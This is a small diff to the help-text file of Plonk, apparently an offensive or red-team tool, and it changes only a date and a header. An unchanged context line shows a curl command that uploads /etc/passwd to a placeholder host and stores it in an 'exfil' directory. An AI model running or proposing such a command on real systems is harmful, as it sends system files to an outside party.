@@ -2,7 +2,7 @@
 # ,help topic text
 # By J. Stuart McMurray
 # Created 20231229
-# Last Modified 20231229
+# Last Modified 20240120
 
 This file contains the information returned by ,help [topic].  Each topic
 starts with the topic name in --'s, has a one-line description used for
@@ -25,7 +25,7 @@ curl -T /etc/passwd https://example.com/p/kittens/etc/passwd
 
 will store /etc/passwd in <plonkdir>/exfil.
 
--- TLS ---
+-- TLS --
 TLS certificate generation
 
 By default, Plonk generates a single self-signed TLS certificate used for any
